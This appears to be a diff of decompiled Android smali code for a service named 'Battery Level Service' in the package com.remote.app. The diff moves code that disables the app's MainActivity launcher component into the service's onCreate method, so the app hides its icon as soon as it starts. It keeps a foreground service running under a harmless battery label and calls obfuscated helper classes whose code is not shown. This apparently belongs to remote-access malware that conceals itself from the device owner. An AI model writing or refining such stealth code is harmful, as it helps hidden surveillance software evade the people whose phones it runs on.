@@ -31,7 +31,7 @@
 
     const/4 v1, 0x0
 
-    const-string v2, "example.permanence"
+    const-string v2, "example_permanence"
 
     const-string v3, "Battery Level Service"
 
@@ -67,15 +67,13 @@
 
     invoke-virtual {v0, v1}, Landroid/support/v4/app/b$b;->a(I)Landroid/support/v4/app/b$b;
 
-    const-string v1, "service"
+    const-string v2, "service"
 
-    invoke-virtual {v0, v1}, Landroid/support/v4/app/b$b;->a(Ljava/lang/String;)Landroid/support/v4/app/b$b;
+    invoke-virtual {v0, v2}, Landroid/support/v4/app/b$b;->a(Ljava/lang/String;)Landroid/support/v4/app/b$b;
 
     invoke-virtual {v0}, Landroid/support/v4/app/b$b;->a()Landroid/app/Notification;
 
     move-result-object v0
-
-    const/4 v1, 0x2
 
     invoke-virtual {p0, v1, v0}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V
 
@@ -93,9 +91,25 @@
 .end method
 
 .method public onCreate()V
-    .locals 2
+    .locals 4
 
     invoke-super {p0}, Landroid/app/Service;->onCreate()V
+
+    invoke-virtual {p0}, Landroid/app/Service;->getPackageManager()Landroid/content/pm/PackageManager;
+
+    move-result-object v0
+
+    new-instance v1, Landroid/content/ComponentName;
+
+    const-class v2, Lcom/remote/app/MainActivity;
+
+    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    const/4 v2, 0x1
+
+    const/4 v3, 0x2
+
+    invoke-virtual {v0, v1, v3, v2}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V
 
     sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
 
@@ -108,13 +122,11 @@
     goto :goto_0
 
     :cond_0
-    const/4 v0, 0x1
+    new-instance v0, Landroid/app/Notification;
 
-    new-instance v1, Landroid/app/Notification;
+    invoke-direct {v0}, Landroid/app/Notification;-><init>()V
 
-    invoke-direct {v1}, Landroid/app/Notification;-><init>()V
-
-    invoke-virtual {p0, v0, v1}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V
+    invoke-virtual {p0, v2, v0}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V
 
     :goto_0
     return-void
@@ -137,25 +149,9 @@
 .end method
 
 .method public onStartCommand(Landroid/content/Intent;II)I
-    .locals 1
+    .locals 0
 
     invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I
-
-    invoke-virtual {p0}, Landroid/app/Service;->getPackageManager()Landroid/content/pm/PackageManager;
-
-    move-result-object p1
-
-    new-instance p2, Landroid/content/ComponentName;
-
-    const-class p3, Lcom/remote/app/MainActivity;
-
-    invoke-direct {p2, p0, p3}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
-
-    const/4 p3, 0x1
-
-    const/4 v0, 0x2
-
-    invoke-virtual {p1, p2, v0, p3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V
 
     new-instance p1, Lcom/remote/app/j;
 
@@ -175,5 +171,7 @@
 
     invoke-static {p0}, Lcom/remote/app/e;->a(Landroid/content/Context;)V
 
-    return p3
+    const/4 p1, 0x1
+
+    return p1
 .end method
